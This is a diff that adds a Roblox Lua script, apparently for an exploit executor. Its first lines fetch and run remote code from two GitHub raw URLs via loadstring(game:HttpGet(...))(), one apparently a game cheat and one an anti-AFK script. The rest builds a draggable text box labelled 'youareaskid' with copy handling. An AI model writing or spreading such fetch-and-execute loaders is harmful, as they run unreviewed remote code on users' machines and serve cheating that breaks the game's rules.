@@ -1,0 +1,90 @@
+-- Execute the two provided scripts
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ACE97x/Games/refs/heads/main/breakabone"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
+
+-- Create the UI
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+-- Create ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+-- Create Frame
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 150, 0, 50)
+Frame.Position = UDim2.new(0.5, -75, 0.5, -25)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+
+-- Create TextBox
+local TextBox = Instance.new("TextBox")
+TextBox.Size = UDim2.new(1, -10, 1, -10)
+TextBox.Position = UDim2.new(0, 5, 0, 5)
+TextBox.BackgroundTransparency = 1
+TextBox.Text = "youareaskid"
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 14
+TextBox.Font = Enum.Font.SourceSans
+TextBox.TextEditable = false
+TextBox.ClearTextOnFocus = false
+TextBox.Parent = Frame
+
+-- Add corner rounding
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = Frame
+
+-- Dragging functionality
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function updateInput(input)
+    local delta = input.Position - dragStart
+    local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    
+    -- Smooth tween for dragging
+    local tween = TweenService:Create(Frame, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {Position = newPos})
+    tween:Play()
+end
+
+Frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Frame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+Frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        updateInput(input)
+    end
+end)
+
+-- Copy functionality
+TextBox.Focused:Connect(function()
+    TextBox:CaptureFocus()
+    TextBox.TextEditable = true
+    TextBox:SelectAll()
+end)
+
+TextBox.FocusLost:Connect(function()
+    TextBox.TextEditable = false
+end)
